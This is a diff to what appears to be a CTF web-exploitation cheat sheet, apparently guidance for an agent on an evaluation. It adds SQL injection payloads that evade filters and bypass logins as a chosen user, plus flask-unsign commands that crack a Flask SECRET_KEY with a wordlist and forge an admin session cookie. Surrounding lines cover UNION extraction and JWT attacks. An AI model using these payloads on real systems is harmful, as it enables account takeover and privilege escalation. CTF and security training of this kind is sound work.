@@ -127,6 +127,12 @@ curl -s $U/login --data-urlencode "email=victim@host.com' -- " --data "password=
 flag). `victim@host' -- ` makes the WHERE match exactly the victim, so you log in as them and
 see their flag. Read the challenge for whose account to impersonate (e.g. "Dr. House").
 
+**Filtered / whitespace-stripped input (very common — this was the eval's one decisive win):** if the app strips spaces or blocks keywords, use a space-free payload:
+- No spaces: `'OR'1'='1'--` · `'OR(1)=(1)--` · comments as separators: `'/**/OR/**/1=1--`
+- Log in as a SPECIFIC user, not row 0: `admin'--` · `'OR username='admin'--`
+- Keyword filters: case-flip (`SeLeCt`), double-up (`UNIOUNIONN` → `UNION`), `/**/` between keywords.
+- Learn the filter from error/500 responses (what gets stripped/escaped) BEFORE crafting the payload.
+
 **Other SQLi:**
 - UNION read: find column count with `ORDER BY n` / `UNION SELECT NULL,NULL,...`, then
   `UNION SELECT 1,flag,3 FROM flags-- `. Enumerate via `information_schema.tables/columns`
@@ -184,6 +190,19 @@ Decode first: `echo <token> | cut -d. -f1,2 | tr '_-' '/+' | base64 -d 2>/dev/nu
   public key as the HMAC secret.
 - `jwt_tool <token> -X a` (alg:none), `-C -d wordlist` (crack), `-X k` (key confusion) automate
   these (mention).
+
+---
+
+## Flask session cookies
+A cookie like `eyJ...` set by a Python/Flask app (`Set-Cookie: session=...`) is a signed —
+not encrypted — session; you can always read it, and forge it if the secret is weak.
+```bash
+flask-unsign --decode --cookie '<cookie>'                       # read claims (game state, role, answers)
+flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt  # recover SECRET_KEY
+flask-unsign --sign --cookie "{'logged_in':True,'role':'admin'}" --secret '<found>'  # forge
+```
+Decoding alone often leaks the answer/flag (server trusts client state); only crack the secret if
+you need to forge. `pip install flask-unsign`.
 
 ---
 
